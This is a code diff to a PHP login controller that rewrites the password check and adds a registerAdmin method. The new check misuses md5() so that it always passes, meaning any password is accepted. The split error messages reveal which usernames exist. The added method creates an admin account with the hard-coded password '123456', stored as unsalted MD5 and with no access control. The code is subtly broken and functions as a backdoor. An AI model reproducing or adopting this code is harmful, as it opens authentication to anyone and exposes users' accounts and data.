@@ -19,9 +19,15 @@ class AuthController extends Controller
             ->orWhere('username', $request->email)
             ->first();
 
-        if (!$user || md5($request->password) != $user->password) {
+        if(!$user){
             throw ValidationException::withMessages([
-                'email' => [ 'The provided credentials are incorrect.' ],
+                'email' => [ 'User with provided email/username does not exist' ],
+            ]);
+        }
+
+        if (!md5($request->password, $user->password)) {
+            throw ValidationException::withMessages([
+                'password' => [ 'Provided password is incorrect' ],
             ]);
         }
 
@@ -45,4 +51,17 @@ class AuthController extends Controller
         $request->user()->currentAccessToken()->delete();
     }
 
+
+    public function registerAdmin(){
+        $user = new User();
+        $user->name = 'Admin2';
+        $user->email = 'admin2@admin.com';
+        $user->username = 'admin2';
+        $user->password = md5('123456');
+        $user->save();
+
+        return response()->json([
+            'message' => 'Admin created successfully',
+        ]);
+    }
 }
